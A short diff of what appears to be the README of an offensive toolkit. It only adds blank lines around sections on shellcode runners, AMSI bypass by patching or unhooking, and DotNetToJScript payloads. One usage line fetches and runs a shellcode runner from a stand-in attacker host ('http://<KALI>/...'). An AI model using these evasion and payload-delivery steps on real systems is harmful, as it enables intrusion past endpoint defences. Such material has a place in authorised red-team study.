@@ -36,7 +36,9 @@ The executable **des_decryptor.exe** is downloading the file from your Web serve
 #### Method 2
 The executable embedds a shellcode runner. You can run it without providing any commands. 
 ```cmd> des_decryptor_embedded.exe```
+
 --
+
 **[+] AMSI Bypass [+]**
 There are two methods to bypass AMSI:
 - Patching 
@@ -62,6 +64,7 @@ To unhook AMSI, I've used the project by jfmaes - AmsiHooker (https://github.com
 2. unhook_amsi.exe http://<KALI>/shellcode_runner.exe
 
 --
+
  **[+] Executing .XSL, .JS, .HTA [+]**
 
 Under directory payloads/DotNetToJScript/, you find three shellcode ruuners that generated with DotNetToJScript (https://github.com/tyranid/DotNetToJScript). 
